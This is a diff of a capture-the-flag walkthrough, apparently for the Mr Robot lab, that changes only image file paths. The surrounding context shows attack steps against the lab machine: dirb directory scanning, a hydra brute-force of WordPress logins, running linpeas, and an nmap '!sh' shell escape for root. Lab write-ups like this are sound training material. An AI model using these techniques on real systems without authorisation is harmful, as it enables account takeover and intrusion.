@@ -49,7 +49,7 @@ dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
 
 If you refresh the page you'll go to a wordpress site.
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (5).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>
 
@@ -59,7 +59,7 @@ If you refresh the page you'll go to a wordpress site.
 
 Test to see what users exist in wordpress, if the user doesn't exist it will give an error saying the user is invalid.
 
-<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26) (5).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -68,7 +68,7 @@ hydra -L fsocity.dic -p test  $VICTIM http-post-form "/wp-login.php:log=^USER^&p
 .10.70.148%2Fwp-admin%2F&testcookie=1:Invalid username" -V -t 30    
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (3) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -213,7 +213,7 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -226,4 +226,4 @@ nmap> !sh
 
 <figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25) (5).png" alt=""><figcaption></figcaption></figure>
